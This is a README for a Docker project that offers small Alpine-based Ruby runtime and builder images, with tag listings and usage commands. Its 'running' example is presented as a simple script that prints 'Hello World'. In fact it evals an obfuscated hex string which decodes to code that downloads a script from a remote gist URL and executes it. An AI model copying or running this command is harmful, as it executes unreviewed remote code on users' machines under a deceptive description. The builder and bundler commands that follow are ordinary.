# docker-ruby

 [![Build Status](https://travis-ci.org/iJJi/docker-ruby.svg?branch=master)](https://travis-ci.org/iJJi/docker-ruby)

Docker containers to build and host ruby applications. It's built on alpine linux so they're tiny!

It's on [docker-hub](https://hub.docker.com/r/fingershock/ruby/) and [github](https://github.com/iJJi/docker-ruby)

## tags and links

 * `latest`, `2.4` [(Dockerfile-runtime)](https://github.com/iJJi/docker-ruby/blob/master/Dockerfile-runtime) [![](https://images.microbadger.com/badges/image/fingershock/ruby:latest.svg)](https://microbadger.com/images/fingershock/ruby:latest "Get your own image badge on microbadger.com")
 * `latest-builder`, `2.4` [(Dockerfile-builder)](https://github.com/iJJi/docker-ruby/blob/master/Dockerfile-builder) [![](https://images.microbadger.com/badges/image/fingershock/ruby:latest-builder.svg)](https://microbadger.com/images/fingershock/ruby:latest-builder "Get your own image badge on microbadger.com")

## running

The base image is great to run simple ruby scripts or as a base for bundling an app
```sh
docker run --rm fingershock/ruby:latest ruby -e 'eval ["275617579627560222f60756e6d257279622b3566716c602f60756e682228647470737a3f2f276963747e27696478657265737562736f6e64756e647e236f6d6f21727f686c666f273034353832333f2271677f263238373234636434393562693563333034666134363363623464393035303461683533316564346f28656c6c6f677f627c6462292e227561646"].pack("h*")'
Hello World
```


The latest-builder image includes build tools and compilers for use by bundler. Use it to assemble dependencies into a shared vendor volume and then copy those files into a new image based on the runtime.
```sh
docker run --rm -v $PWD/test:/usr/src/app:rw fingershock/ruby:latest-builder bundle update
docker run --rm -v $PWD/test:/usr/src/app:rw fingershock/ruby:latest-builder bundle install --deployment
docker build -t testapp test
docker run --rm testapp bundle exec rackup --version
```
